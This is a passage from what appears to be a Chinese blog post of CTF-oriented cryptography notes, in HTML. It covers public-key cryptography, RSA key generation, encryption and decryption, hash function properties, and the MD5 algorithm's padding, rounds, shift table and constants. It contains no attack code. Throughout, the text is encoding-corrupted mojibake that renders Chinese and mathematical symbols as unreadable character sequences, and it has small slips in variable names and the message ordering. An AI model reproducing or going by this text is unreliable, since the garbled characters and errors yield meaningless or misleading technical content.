æ€§ã€‚</p><p>ç¬¬äºŒä¸ªé—®é¢˜æ•°å­—ç­¾å­—è€ƒè™‘çš„æ˜¯å¦‚ä½•ä¸ºæ•°å­—åŒ–çš„æ¶ˆæ¯æˆ–æ–‡ä»¶æä¾›ä¸€ç§ç±»ä¼¼äºä¸ºä¹¦é¢æ–‡ä»¶æ‰‹ä¹¦ç­¾å­—çš„æ–¹æ³•ã€‚</p><p>1976 å¹´W. Diffie å’ŒM. Hellman å¯¹è§£å†³ä¸Šè¿°ä¸¤ä¸ªé—®é¢˜è·å¾—äº†çªç ´ï¼Œ ä»è€Œæå‡ºäº†å…¬é’¥å¯†ç ä½“åˆ¶ã€‚</p><h3 id="1ã€MH-æ–¹æ³•"><a href="#1ã€MH-æ–¹æ³•" class="headerlink" title="1ã€MH æ–¹æ³•"></a>1ã€MH æ–¹æ³•</h3><p>1978 å¹´ï¼Œç¾å›½æ–¯å¦ç¦å¤§å­¦çš„ R. C. Merkle å’Œ M. E. Hellman åœ¨â€Hiding information and signatures in trapdoor knapsacksâ€ ä¸€æ–‡ä¸­ï¼Œå»ºç«‹äº†ä¸€ç§åŸºäºé™·é—¨èƒŒåŒ…çš„å…¬é’¥å¯†ç ç³»ç»Ÿã€‚</p><h3 id="2ã€RSA"><a href="#2ã€RSA" class="headerlink" title="2ã€RSA"></a>2ã€RSA</h3><p>RSA ç®—æ³•æ˜¯1978 å¹´ç”±R. Rivest ã€A. Shamir å’ŒL. Adleman æå‡ºçš„ä¸€ç§ç”¨æ•°è®ºæ„é€ çš„ã€ä¹Ÿæ˜¯è¿„ä»Šä¸ºæ­¢ç†è®ºä¸Šæœ€ä¸ºæˆç†Ÿå®Œå–„çš„å…¬é’¥å¯†ç ä½“åˆ¶ï¼Œ è¯¥ä½“åˆ¶å·²å¾—åˆ°å¹¿æ³›çš„åº”ç”¨ã€‚</p><p>RSA ä¾èµ–çš„å›°éš¾é—®é¢˜æ˜¯ï¼šæ•´æ•°åˆ†è§£ä¸ºç´ æ•°æ˜¯ä¸ªå›°éš¾é—®é¢˜ï¼Œæˆ–è€…è¯´ç´ åˆ†è§£æ˜¯ä¸ªè®¡ç®—ä¸Šå›°éš¾çš„é—®é¢˜ã€‚ ä½†æ˜¯å¦‚æœæœ‰ä¸€ç»„ç´ æ•°ï¼Œè®¡ç®—å‡ºè¿™ç»„ç´ æ•°çš„åˆæ•°ï¼Œå´æ˜¯ä¸€ä¸ªå®¹æ˜“çš„é—®é¢˜ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ RSA è®¡ç®—å›°éš¾é—®é¢˜åŸºäºçš„â€œæ•´æ•°åˆ†è§£â€ï¼Œä½†æ˜¯ RSA ç ´è§£å¹¶ä¸ç­‰ä»·äºâ€œæ•´æ•°åˆ†è§£é—®é¢˜â€ã€‚</p><h4 id="1ï¼‰å¯†é’¥"><a href="#1ï¼‰å¯†é’¥" class="headerlink" title="1ï¼‰å¯†é’¥"></a>1ï¼‰å¯†é’¥</h4><ul><li><p>ç”¨æˆ·é€‰å–ä¸¤ä¸ªä¸åŒçš„å¤§ç´ æ•° ğ‘ å’Œ ğ‘</p></li><li><p>è®¡ç®— ğ‘› = ğ‘ğ‘,  ğœ™(ğ‘›) = (ğ‘ âˆ’ 1) (ğ‘ âˆ’ 1) ã€‚å…¶ä¸­ ğœ™(ğ‘›) æ˜¯ n çš„æ¬§æ‹‰å‡½æ•°å€¼ã€‚</p></li><li>é€‰ä¸€ä¸ªæ­£æ•´æ•° ğ‘’ï¼Œæ»¡è¶³ 1&lt; ğ‘’ &lt; ğœ™(ğ‘›) ä¸” ğ‘”ğ‘ğ‘‘(ğœ™(ğ‘›)ï¼Œğ‘’) = 1 </li><li>è®¡ç®— ğ‘’ æ¨¡ ğœ™(ğ‘›) çš„é€†å…ƒ ğ‘‘ï¼Œä¹Ÿå°±æ˜¯è¯´ ğ‘’ğ‘‘ = 1 ğ‘šğ‘œğ‘‘ ğœ™(ğ‘›)</li><li>(ğ‘’, ğ‘›) åšä¸ºå…¬é’¥ï¼Œ(ğ‘‘, ğ‘›) åšä¸ºç§é’¥</li></ul><h4 id="2ï¼‰åŠ å¯†"><a href="#2ï¼‰åŠ å¯†" class="headerlink" title="2ï¼‰åŠ å¯†"></a>2ï¼‰åŠ å¯†</h4><p>åŠ å¯†æ—¶é¦–å…ˆå°†æ˜æ–‡æ¯”ç‰¹ä¸²åˆ†ç»„ï¼Œ ä½¿å¾—æ¯ä¸ªåˆ†ç»„å¯¹åº”çš„åè¿›åˆ¶æ•°å°äº nï¼Œå³åˆ†ç»„é•¿åº¦å°äº $\log_2 n$ ã€‚ç„¶åå¯¹æ¯ä¸ªæ˜æ–‡åˆ†ç»„ mï¼Œä½œåŠ å¯†è¿ç®—ï¼š</p><script type="math/tex; mode=display">c = m^e \quad (mod \ n)</script><blockquote><p>RSAæ˜¯åˆ†ç»„åŠ å¯†ï¼Œå–ä¸€ä¸ªæ˜æ–‡åˆ†ç»„ ğ‘€ï¼Œ0 â‰¤ ğ‘€ â‰¤ ğ‘›âˆ’1,ğ¶ = ğ‘€^ğ‘’ (ğ‘šğ‘œğ‘‘ ğ‘›)ã€‚ </p></blockquote><h4 id="3ï¼‰è§£å¯†"><a href="#3ï¼‰è§£å¯†" class="headerlink" title="3ï¼‰è§£å¯†"></a>3ï¼‰è§£å¯†</h4><p>å¯¹å¯†æ–‡åˆ†ç»„çš„è§£å¯†è¿ç®—ä¸ºï¼š</p><script type="math/tex; mode=display">m = c^d \quad (mod \ n)</script><h2 id="0x05-å“ˆå¸Œå‡½æ•°ï¼ˆMD5ï¼‰"><a href="#0x05-å“ˆå¸Œå‡½æ•°ï¼ˆMD5ï¼‰" class="headerlink" title="0x05 å“ˆå¸Œå‡½æ•°ï¼ˆMD5ï¼‰"></a>0x05 å“ˆå¸Œå‡½æ•°ï¼ˆMD5ï¼‰</h2><h3 id="1ã€å“ˆå¸Œå‡½æ•°å®šä¹‰"><a href="#1ã€å“ˆå¸Œå‡½æ•°å®šä¹‰" class="headerlink" title="1ã€å“ˆå¸Œå‡½æ•°å®šä¹‰"></a>1ã€å“ˆå¸Œå‡½æ•°å®šä¹‰</h3><p>å“ˆå¸Œå‡½æ•° H æ˜¯ä¸€å…¬å¼€å‡½æ•°ï¼Œç”¨äºå°†ä»»æ„é•¿çš„æ¶ˆæ¯ M æ˜ å°„ä¸ºè¾ƒçŸ­çš„ã€å›ºå®šé•¿åº¦çš„ä¸€ä¸ªå€¼ H(M) ï¼Œä½œä¸ºè®¤è¯ç¬¦ï¼Œç§°å‡½æ•°å€¼ H(M) ä¸ºå“ˆå¸Œå€¼æˆ–å“ˆå¸Œç æˆ–æ¶ˆæ¯æ‘˜è¦ã€‚å“ˆå¸Œç æ˜¯æ¶ˆæ¯ä¸­æ‰€æœ‰æ¯”ç‰¹çš„å‡½æ•°ï¼Œå› æ­¤æä¾›äº†ä¸€ç§é”™è¯¯æ£€æµ‹èƒ½åŠ›ï¼Œå³æ”¹å˜æ¶ˆæ¯ä¸­ä»»ä½•ä¸€ä¸ªæ¯”ç‰¹æˆ–å‡ ä¸ªæ¯”ç‰¹éƒ½ä¼šä½¿å“ˆå¸Œç å‘ç”Ÿæ”¹å˜ã€‚</p><h3 id="2ã€å“ˆå¸Œå‡½æ•°ç‰¹ç‚¹"><a href="#2ã€å“ˆå¸Œå‡½æ•°ç‰¹ç‚¹" class="headerlink" title="2ã€å“ˆå¸Œå‡½æ•°ç‰¹ç‚¹"></a>2ã€å“ˆå¸Œå‡½æ•°ç‰¹ç‚¹</h3><p>å“ˆå¸Œå‡½æ•°çš„ç›®çš„æ˜¯ä¸ºéœ€è®¤è¯çš„æ•°æ®äº§ç”Ÿä¸€ä¸ªâ€œæŒ‡çº¹â€ ã€‚ä¸ºäº†èƒ½å¤Ÿå®ç°å¯¹æ•°æ®çš„è®¤è¯ï¼Œå“ˆå¸Œå‡½æ•°åº”æ»¡è¶³ä»¥ä¸‹æ€§è´¨ï¼š</p><ul><li><p>å‡½æ•°çš„è¾“äººå¯ä»¥æ˜¯ä»»æ„é•¿ï¼Œå‡½æ•°çš„è¾“å‡ºæ˜¯å›ºå®šé•¿ã€‚</p></li><li><p>å·²çŸ¥ x ï¼Œæ±‚ H(x) è¾ƒä¸ºå®¹æ˜“ï¼Œå¯ç”¨ç¡¬ä»¶æˆ–è½¯ä»¶å®ç°ã€‚</p></li><li><p>å·²çŸ¥ hï¼Œæ±‚ä½¿å¾— H(x) = h çš„ x åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„ã€‚</p><blockquote><p>è¿™ä¸€æ€§è´¨ç§°ä¸ºå‡½æ•°çš„å•å‘æ€§ï¼Œç§° H(x) ä¸ºå•å‘å“ˆå¸Œå‡½æ•°ã€‚ </p></blockquote></li><li><p>å·²çŸ¥ x ï¼Œæ‰¾å‡º y ï¼ˆx!=yï¼‰ï¼Œä½¿å¾— ğ»(x) = ğ»(y) åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„ã€‚</p><blockquote><p>å¦‚æœå•å‘å“ˆå¸Œå‡½æ•°æ»¡è¶³è¿™ä¸€æ€§è´¨ï¼Œ åˆ™ç§°å…¶ä¸ºå¼±å•å‘å“ˆå¸Œå‡½æ•°ã€‚</p></blockquote></li><li><p>æ‰¾å‡ºä»»æ„ä¸¤ä¸ªä¸åŒçš„è¾“å…¥ æƒ³ xã€y ï¼Œ ä½¿å¾— ğ»(x) = ğ»(y) åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„ã€‚</p><blockquote><p>å¦‚æœå•å‘å“ˆå¸Œå‡½æ•°æ»¡è¶³è¿™ä¸€æ€§è´¨ï¼Œ åˆ™ç§°å…¶ä¸ºå¼ºå•å‘å“ˆå¸Œå‡½æ•°ã€‚</p></blockquote></li></ul><h3 id="3ã€MD5"><a href="#3ã€MD5" class="headerlink" title="3ã€MD5"></a>3ã€MD5</h3><p>MD5 æ˜¯ Ron Rivest åœ¨ 1990 å¹´ 10 æœˆä½œä¸º RFC æå‡ºçš„ (RFC 1321)ï¼Œå…¶å‰èº«æ˜¯ MD4(RFC 1320)ã€‚MD5 è¾“å…¥ä¸ºä»»æ„é•¿åº¦çš„ä¿¡æ¯ï¼Œè¾“å‡º 128bit çš„æ‘˜è¦ä¿¡æ¯ (æ•£åˆ—å€¼)ã€‚</p><h4 id="MD5-ç®—æ³•"><a href="#MD5-ç®—æ³•" class="headerlink" title="MD5 ç®—æ³•"></a>MD5 ç®—æ³•</h4><p><img src="/2021/11/20/CTF/Crypto/Crypto/45dc898751a2af11929f9f4506445445.png" alt="image-20211123153415491"><img src="/2021/11/20/CTF/Crypto/Crypto/42cc6117d75d7eef7cce5e04a78bf19a.png" alt="image-20211123153458708"></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/d3b09550b3c08a2fb6758a85a2a687c0.png" alt="image-20211123153606631"></p><h5 id="æ¶ˆæ¯å¡«å……"><a href="#æ¶ˆæ¯å¡«å……" class="headerlink" title="æ¶ˆæ¯å¡«å……"></a>æ¶ˆæ¯å¡«å……</h5><p>å¡«å……åçš„æ¶ˆæ¯æ¯”ç‰¹é•¿åº¦ L ä¸ºæ¨¡ 512 ä¸‹æ˜¯ 448ï¼Œä¹Ÿå°±æ˜¯è¯´ ğ¿ â‰¡ 448 (ğ‘šğ‘œğ‘‘ 512)ï¼Œæˆ–è€…è¯´ ğ¿ = ğ‘› Ã— 512 + 448ï¼Œn ä¸ºå¤§äºç­‰äº 1 çš„æ­£æ•´æ•°ã€‚å¡«å……æ–¹å¼ä¸ºç¬¬ä¸€ä½ä¸º 1ï¼Œåé¢ä¸º 0. </p><h5 id="é™„åŠ æ¶ˆæ¯é•¿åº¦"><a href="#é™„åŠ æ¶ˆæ¯é•¿åº¦" class="headerlink" title="é™„åŠ æ¶ˆæ¯é•¿åº¦"></a>é™„åŠ æ¶ˆæ¯é•¿åº¦</h5><p>å‰é¢å¡«å……åæœ€åæœ‰ 448bitï¼Œ448+64=512bitï¼Œç•™ä¸‹çš„è¿™ 64bit ç”¨äºå¡«å†™é™„åŠ æ¶ˆæ¯é•¿åº¦ï¼Œ ç”¨ little-endian æ–¹å¼å­˜å‚¨ã€‚é‚£ä¹ˆå¯å­˜å‚¨çš„æœ€å¤§é™„åŠ æ¶ˆæ¯é•¿åº¦ä¸º 2^64ï¼Œå¦‚æœæ¶ˆæ¯é•¿åº¦å¤§äºæ­¤æ•°ï¼Œå­˜å‚¨é•¿åº¦æ¨¡ 2^64 åçš„å€¼ã€‚ é™„åŠ æ¶ˆæ¯é•¿åº¦åï¼Œè¿›è¡Œåç»­è¿ç®—çš„æ¶ˆæ¯é•¿åº¦æ˜¯ 512 çš„å€æ•°ã€‚ </p><h5 id="ç¼“å†²åŒºåˆå§‹åŒ–"><a href="#ç¼“å†²åŒºåˆå§‹åŒ–" class="headerlink" title="ç¼“å†²åŒºåˆå§‹åŒ–"></a>ç¼“å†²åŒºåˆå§‹åŒ–</h5><p>åˆå§‹åŒ–MD5æ ¸å¿ƒç®—æ³•ä¸­çš„ğ‘Š0, ğ‘‹0, ğ‘Œ0, ğ‘0ï¼Œğ‘Š0 = 01 23 45 67ï¼›ğ‘‹0 = 89 ğ´ğµ ğ¶ğ· ğ¸ğ¹ï¼›ğ‘Œ0 = ğ¹ğ¸ ğ·ğ¶ ğµğ´ 98ï¼›ğ‘0 = 76 54 32 10 ã€‚</p><h5 id="åˆ†ç»„æµæ°´å¤„ç†"><a href="#åˆ†ç»„æµæ°´å¤„ç†" class="headerlink" title="åˆ†ç»„æµæ°´å¤„ç†"></a>åˆ†ç»„æµæ°´å¤„ç†</h5><p>å°†æ¶ˆæ¯åˆ†ä¸º n ä¸ª 512bit é•¿åº¦çš„åˆ†ç»„ ğ‘š1, ğ‘š2, . . . , ğ‘šğ‘›ï¼Œç„¶åå¯¹ n ä¸ªåˆ†ç»„ä¾æ¬¡æ‰§è¡Œï¼š </p><ol><li><p>(ğ‘Š1, ğ‘‹1, ğ‘Œ1, ğ‘1) = ğ»ğ‘€ğ·5 (ğ‘Š0, ğ‘‹0, ğ‘Œ0, ğ‘0, ğ‘š1) </p></li><li><p>(ğ‘Š2, ğ‘‹2, ğ‘Œ2, ğ‘2) = ğ»ğ‘€ğ·5 (ğ‘Š1, ğ‘‹1, ğ‘Œ1, ğ‘1, ğ‘š2) </p></li><li><p>(ğ‘Š3, ğ‘‹3, ğ‘Œ3, ğ‘3) = ğ»ğ‘€ğ·5 (ğ‘Š2, ğ‘‹2, ğ‘Œ2, ğ‘2, ğ‘š3) </p><p>Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·</p></li><li><p>(ğ‘Šğ‘›, ğ‘‹ğ‘›, ğ‘Œğ‘›, ğ‘ğ‘›) = ğ»ğ‘€ğ·5 (ğ‘Šğ‘›âˆ’1, ğ‘‹ğ‘›âˆ’1, ğ‘Œğ‘›âˆ’1, ğ‘ğ‘›âˆ’1, ğ‘šğ‘›) </p></li></ol><h5 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>MD5 çš„è¾“å‡ºä¸º ğ‘Šğ‘›||ğ‘‹ğ‘›||ğ‘Œğ‘›||ğ‘ğ‘›ã€‚ </p><h5 id="MD5-ç®—æ³•è¡¨ç¤º"><a href="#MD5-ç®—æ³•è¡¨ç¤º" class="headerlink" title="MD5 ç®—æ³•è¡¨ç¤º"></a>MD5 ç®—æ³•è¡¨ç¤º</h5><p>æ•´ä¸ª MD5 ç®—æ³•ï¼Œè¾“å…¥ä¸ºåŸå§‹æ¶ˆæ¯ ğ‘€ğ‘ ï¼Œåˆå§‹é‡ğ‘Š0, ğ‘‹0, ğ‘Œ0, ğ‘0ï¼Œè¾“å‡ºä¸º 128bitï¼Œğ‘Š||ğ‘‹||ğ‘Œ ||ğ‘ï¼Œ æˆ‘ä»¬è®°ä¸º (ğ‘Š, ğ‘‹, ğ‘Œ, ğ‘) ğ‘œğ‘Ÿ ğ‘Š||ğ‘‹||ğ‘Œ ||ğ‘ = ğ‘€ğ·5(ğ‘Š0, ğ‘‹0, ğ‘Œ0, ğ‘0, ğ‘€ğ‘ ). </p><h4 id="æ ¸å¿ƒç®—æ³•HMD5"><a href="#æ ¸å¿ƒç®—æ³•HMD5" class="headerlink" title="æ ¸å¿ƒç®—æ³•HMD5"></a>æ ¸å¿ƒç®—æ³•HMD5</h4><p>æ ¸å¿ƒç®—æ³• ğ»ğ‘€ğ·5 æ˜¯ä¸ªåˆ†ç»„ç®—æ³•ï¼Œè¾“å…¥æ˜¯ 512 ä½çš„åˆ†ç»„æ•°æ®ï¼Œè¾“å‡ºæ˜¯ 128 ä½ã€‚ </p><h5 id="HMD5-ç®—æ³•"><a href="#HMD5-ç®—æ³•" class="headerlink" title="HMD5 ç®—æ³•"></a>HMD5 ç®—æ³•</h5><p>ğ»ğ‘€ğ·5 ç®—æ³•çš„ä¼ªä»£ç å¦‚ä¸‹ï¼š<br>ğ‘€, ğ‘Š0, ğ‘‹0, ğ‘Œ0, ğ‘0<br>(ğ‘Š1, ğ‘‹1, ğ‘Œ1, ğ‘1) = ğ‘…(ğ¹, ğº, ğ», ğ¼, ğ‘Š0, ğ‘‹0, ğ‘Œ0, ğ‘0, ğ‘€)<br>ğ‘Š = ğ‘Š0 + ğ‘Š1 (ğ‘šğ‘œğ‘‘ 2^32)<br>ğ‘‹ = ğ‘‹0 + ğ‘‹1 (ğ‘šğ‘œğ‘‘ 2^32)<br>ğ‘Œ = ğ‘Œ0 + ğ‘Œ1 (ğ‘šğ‘œğ‘‘ 2^32)<br>ğ‘ = ğ‘0 + ğ‘1 (ğ‘šğ‘œğ‘‘ 2^32)<br>è¾“å‡º W,X,Y,Z</p><p>ä¸Šé¢ä¼ªä»£ç è¡¨ç¤ºçš„è¿™ä¸ªç®—æ³•ï¼Œå…¶è¾“å…¥æ˜¯ ğ‘€, ğ‘Š0, ğ‘‹0, ğ‘Œ0, ğ‘0ï¼Œç®—æ³•è¾“å‡ºæ˜¯ W, X, Y, Z, ç”¨ (ğ‘Š, ğ‘‹, ğ‘Œ, ğ‘‹) = ğ»ğ‘€ğ·5 (ğ‘Š0, ğ‘‹0, ğ‘Œ0, ğ‘0, ğ‘€) ç¬¦å·åŒ–æ¥è¡¨ç¤ºã€‚ </p><h5 id="å››è½®è¿ç®—-R"><a href="#å››è½®è¿ç®—-R" class="headerlink" title="å››è½®è¿ç®— R"></a>å››è½®è¿ç®— R</h5><p>ç®—æ³•çš„è¾“å…¥æ˜¯512bitçš„æ¶ˆæ¯Mï¼Œæˆ‘ä»¬å†å°†å…¶åˆ†ä¸º16ç»„ï¼Œæ¯ç»„32bitï¼Œğ‘€ = ğ‘€0||ğ‘€1||ğ‘€2|| . . . ||ğ‘€15, ç„¶åå¯¹å…¶è¿›è¡Œå››è½®æ ¸å¿ƒè¿ç®—ã€‚æˆ‘ä»¬å°†æ•´ä¸ªå››è½®è¿ç®—è¿‡ç¨‹è®°ä¸º ğ‘…(ğ¹, ğº, ğ», ğ¼, ğ‘Š, ğ‘‹, ğ‘Œ, ğ‘, ğ‘€) : ğ‘Š Ã— ğ‘‹ Ã— ğ‘Œ Ã— ğ‘ Ã— ğ‘€ â†’ ğ‘Š Ã— ğ‘‹ Ã— ğ‘Œ Ã— ğ‘, ä¹Ÿå°±æ˜¯è¯´è¿™å››è½®è¿ç®—åè¾“å‡ºæ˜¯æ–°çš„ W,X,Y,X, ä¸‹é¢æˆ‘ä»¬çœ‹çœ‹å››è½®è¿ç®—çš„å…·ä½“è¿‡ç¨‹</p><ul><li>ç¬¬ä¸€è½® C ä¸º F, æ‰€ä»¥æ ¸å¿ƒè¿ç®—æ˜¯ FF(W,X,Y,Z,M,s,t)ï¼Œåœ¨ç¬¬ä¸€è½®ä¸­ä¾æ¬¡å¯¹ 16 ä¸ªåˆ†ç»„æ•° æ®æ‰§è¡Œ FF è¿ç®—ï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€è½®æ‰§è¡Œ 16 æ¬¡ FF è¿ç®—ï¼Œæ¯ä¸€æ¬¡çš„æ‰§è¡Œ FF æ—¶ï¼ŒW,X,Y,X æ˜¯ä¸Š ä¸€æ¬¡è¿ç®—åçš„ W,X,Y,Xï¼Œåœ¨æ‰§è¡Œç¬¬ä¸€æ¬¡ FF æ—¶ï¼ŒW,X,Y,X çš„åˆå§‹å€¼ä¸ºï¼Œğ‘Š = 0ğ‘¥01234567, ğ‘‹ = 0ğ‘¥89ğ‘ğ‘ğ‘ğ‘‘ğ‘’ ğ‘“ , ğ‘Œ = 0ğ‘¥ ğ‘“ ğ‘’ğ‘‘ğ‘ğ‘ğ‘98, ğ‘ = 0ğ‘¥76543210. æˆ‘ä»¬ç”¨ä¼ªä»£ç æè¿°æ­¤è½®ç®—æ³•ï¼š<br>W,X,Y,Z åˆå§‹åŒ–<br>for i=0 to 15<br>ğ¹ğ¹(ğ‘Š, ğ‘‹, ğ‘Œ, ğ‘, ğ‘€1 ğ‘– , ğ‘ 1 ğ‘– , ğ‘¡ğ‘–+1)<br>ğ‘Š ğ‘‹ğ‘Œ ğ‘ = ğ‘Š ğ‘‹ğ‘Œ ğ‘ &gt;&gt; 32; è¡¨ç¤ºå°†å››ä¸ªå€¼è¿æ¥ï¼Œç„¶åå³å¾ªç¯ç§»ä½ 32ï¼Œ ä¹Ÿå°±æ˜¯æ–° W å€¼ä¸ºæ—§ Zï¼Œæ–° X å€¼ä¸ºæ—§ Wï¼Œæ–° Y å€¼ä¸ºæ—§ Xï¼Œæ–° Z å€¼ä¸ºæ—§ Y</li><li>ç¬¬äºŒè½® C ä¸º Gï¼š<br>W,X,Y,Z ä¸Šä¸€è½®é—ç•™å€¼<br>for i=0 to 15<br>ğºğº(ğ‘Š, ğ‘‹, ğ‘Œ, ğ‘, ğ‘€2 ğ‘– , ğ‘ 2 ğ‘– , ğ‘¡ğ‘–+17)<br>ğ‘Š ğ‘‹ğ‘Œ ğ‘ = ğ‘Š ğ‘‹ğ‘Œ ğ‘ &gt;&gt; 32; è¡¨ç¤ºå°†å››ä¸ªå€¼è¿æ¥ï¼Œç„¶åå³å¾ªç¯ç§»ä½ 32ï¼Œ ä¹Ÿå°±æ˜¯æ–° W å€¼ä¸ºæ—§ Zï¼Œæ–° X å€¼ä¸ºæ—§ Wï¼Œæ–° Y å€¼ä¸ºæ—§ Xï¼Œæ–° Z å€¼ä¸ºæ—§ Y</li><li>ç¬¬ä¸‰è½® C ä¸º Hï¼š<br>W,X,Y,Z ä¸Šä¸€è½®é—ç•™å€¼<br>for i=0 to 15<br>ğ»ğ»(ğ‘Š, ğ‘‹, ğ‘Œ, ğ‘, ğ‘€3 ğ‘– , ğ‘ 3 ğ‘– , ğ‘¡ğ‘–+33)<br>ğ‘Š ğ‘‹ğ‘Œ ğ‘ = ğ‘Š ğ‘‹ğ‘Œ ğ‘ &gt;&gt; 32; è¡¨ç¤ºå°†å››ä¸ªå€¼è¿æ¥ï¼Œç„¶åå³å¾ªç¯ç§»ä½ 32ï¼Œ ä¹Ÿå°±æ˜¯æ–° W å€¼ä¸ºæ—§ Zï¼Œæ–° X å€¼ä¸ºæ—§ Wï¼Œæ–° Y å€¼ä¸ºæ—§ Xï¼Œæ–° Z å€¼ä¸ºæ—§ Y</li><li>ç¬¬å››è½® C ä¸º Iï¼š<br>W,X,Y,Z ä¸Šä¸€è½®é—ç•™å€¼<br>for i=0 to 15<br>ğ¼ ğ¼(ğ‘Š, ğ‘‹, ğ‘Œ, ğ‘, ğ‘€4 ğ‘– , ğ‘ 4 ğ‘– , ğ‘¡ğ‘–+49)<br>ğ‘Š ğ‘‹ğ‘Œ ğ‘ = ğ‘Š ğ‘‹ğ‘Œ ğ‘ &gt;&gt; 32; è¡¨ç¤ºå°†å››ä¸ªå€¼è¿æ¥ï¼Œç„¶åå³å¾ªç¯ç§»ä½ 32ï¼Œ ä¹Ÿå°±æ˜¯æ–° W å€¼ä¸ºæ—§ Zï¼Œæ–° X å€¼ä¸ºæ—§ Wï¼Œæ–° Y å€¼ä¸ºæ—§ Xï¼Œæ–° Z å€¼ä¸ºæ—§ Y </li></ul><h5 id="R-ä¸­çš„-ğ‘€ğ‘›-ğ‘–-ğ‘›-1-2-3-4"><a href="#R-ä¸­çš„-ğ‘€ğ‘›-ğ‘–-ğ‘›-1-2-3-4" class="headerlink" title="R ä¸­çš„ ğ‘€ğ‘› ğ‘– , (ğ‘› = 1, 2, 3, 4)"></a>R ä¸­çš„ ğ‘€ğ‘› ğ‘– , (ğ‘› = 1, 2, 3, 4)</h5><p>å››è½®è¿ç®—ä¸­ï¼Œæ¯è½®æ¶ˆæ¯é¡ºåºä¸åŒï¼Œç¬¬ä¸€è½®ä¸ºé¡ºæ¬¡ï¼Œæ¶ˆæ¯ä» ğ‘€0, ğ‘€2, . . . , ğ‘€15ï¼Œç¬¬äºŒã€ä¸‰ã€ å››è½®ï¼Œå¯¹ M çš„é¡ºåºè¿›è¡Œäº†ç½®æ¢ï¼š<br>ç¬¬ä¸€è½® ğ‘€1 ğ‘– = ğ‘€ğ‘– , ğ‘– = 0, 1, . . . , 15<br>ç¬¬äºŒè½® ğ‘€2 ğ‘– = ğ‘€1+5ğ‘– ğ‘šğ‘œğ‘‘ 16, ğ‘– = 0, 1, . . . , 15<br>ç¬¬ä¸‰è½® ğ‘€3 ğ‘– = ğ‘€5+3ğ‘– ğ‘šğ‘œğ‘‘ 16, ğ‘– = 0, 1, . . . , 15<br>ç¬¬å››è½® ğ‘€4 ğ‘– = ğ‘€7ğ‘– ğ‘šğ‘œğ‘‘ 16, ğ‘– = 0, 1, . . . , 15 </p><p>æŒ‰ä¸Šé¢å…¬å¼ï¼Œå¯çŸ¥ï¼Œç¬¬äºŒè½® M çš„é¡ºåºæ˜¯ï¼š ğ‘€1, ğ‘€6, ğ‘€11, ğ‘€0, ğ‘€5, ğ‘€10, ğ‘€15, ğ‘€4, ğ‘€9, ğ‘€14, ğ‘€3, ğ‘€8, ğ‘€13, ğ‘€2, ğ‘€7, ğ‘€12 </p><h5 id="R-ä¸­çš„-ğ‘ -ğ‘›-ğ‘–-ğ‘›-1-2-3-4"><a href="#R-ä¸­çš„-ğ‘ -ğ‘›-ğ‘–-ğ‘›-1-2-3-4" class="headerlink" title="R ä¸­çš„ ğ‘  ğ‘› ğ‘– , (ğ‘› = 1, 2, 3, 4)"></a>R ä¸­çš„ ğ‘  ğ‘› ğ‘– , (ğ‘› = 1, 2, 3, 4)</h5><p>æ¯è½®æ¯æ¬¡è¿ç®—ç§»ä½æ•° ğ‘  ğ‘› ğ‘– çš„å–å€¼å¦‚è¡¨7.1ï¼Œn è¡¨ç¤ºæ—¶ç¬¬å‡ è½®ï¼Œi è¡¨ç¤ºæ˜¯æœ¬è½®çš„ç¬¬å‡ æ¬¡è¿ç®—ã€‚ </p><h5 id="R-ä¸­çš„-ğ‘¡ğ‘–"><a href="#R-ä¸­çš„-ğ‘¡ğ‘–" class="headerlink" title="R ä¸­çš„ ğ‘¡ğ‘–"></a>R ä¸­çš„ ğ‘¡ğ‘–</h5><p>æ¯è½®ä¸­çš„æ¯æ¬¡è¿ç®—éƒ½æœ‰ ğ‘¡ğ‘–ï¼Œä»–æ˜¯ä¸ªå¸¸æ•°ï¼Œåœ¨å››è½®è¿ç®—ä¸­å…¶æ˜¯é¡ºåºå˜æ¢ï¼Œå…±æœ‰ 64 ä¸ªå¸¸ æ•°å€¼ ğ‘¡1, ğ‘¡2, . . . , ğ‘¡64ï¼Œæˆ‘ä»¬è¿™æ ·è®¾å®šè¿™ä¸ªå¸¸æ•°å€¼,ğ‘¡ğ‘– = [2 32 Ã— ğ‘ğ‘ğ‘ (ğ‘ ğ‘–ğ‘›(ğ‘–))], å…¶ä¸­ i çš„å•ä½ä¸ºå¼§åº¦ (RAD)ï¼Œ[] è¡¨ç¤ºå–æ•´è¿ç®—ï¼Œå°±æ˜¯å–ä¸€ä¸ªæ•°çš„æ•´æ•°éƒ¨åˆ†ï¼Œabs æ˜¯ç»å¯¹å€¼ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥äº‹ å…ˆåšå¥½è¿™ä¸ªå¸¸æ•°è¡¨ï¼Œä»¥å¤‡è®¡ç®—æ˜¯ä½¿ç”¨ï¼Œä¸‹é¢æˆ‘ä»¬è®¡ç®— ğ‘¡1ã€‚ </p><p>ğ‘¡1 = [2 32 Ã— ğ‘ğ‘ğ‘ (ğ‘ ğ‘–ğ‘›(1))] = [3614090360.3] = 3614090360 = [ğ‘‘76ğ‘ğ‘478]16 </p><p>è¡¨ 7.1: MD5 ä¸­å¾ªç¯ç§»ä½æ“ä½œå‚æ•°é€‰æ‹©</p><p> è½®æ•° å‚æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 1 7 12 17 22 7 12 17 22 7 12 17 22 7 12 17 22 2 5 9 14 20 5 9 14 20 5 9 14 20 5 9 14 20 3 4 11 16 23 4 11 16 23 4 11 16 23 4 11 16 23 4 6 10 15 21 6 10 15 21 6 10 15 21 6 10 15 21 </p><h5 id="æ ¸å¿ƒè¿ç®—"><a href="#æ ¸å¿ƒè¿ç®—" class="headerlink" title="æ ¸å¿ƒè¿ç®—"></a>æ ¸å¿ƒè¿ç®—</h5><p>æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæ 